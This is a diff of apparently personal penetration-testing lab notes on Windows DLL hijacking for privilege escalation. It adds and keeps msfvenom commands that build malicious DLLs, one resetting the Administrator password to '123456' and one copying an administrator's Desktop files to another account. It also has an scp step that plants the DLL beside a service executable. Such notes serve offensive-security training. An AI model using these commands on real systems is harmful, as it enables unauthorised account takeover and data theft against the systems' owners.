@@ -3542,8 +3542,16 @@ look first for an empty description
 find path
 Check if you can write into the directory or rename the executable
 To check what account it will use on log on RC the file -> properties -> security
+
+
+
 msfvenom -p windows/exec CMD='cmd.exe /C "xcopy C:\Users\Admin\Desktop C:\Users\comrade.WIN2-INTERNAL-D /s"' -f dll > hijackmeplz.dll
+
+msfvenom -p windows/exec CMD='cmd.exe /C "net user Administrator 123456"' -f dll > hijackmeplz.dll
+
 scp student@10.50.38.176:/home/student/hijackmeplz.dll “C:\Path to executable\hijackmeplz.dll”
+
+
 
 
 
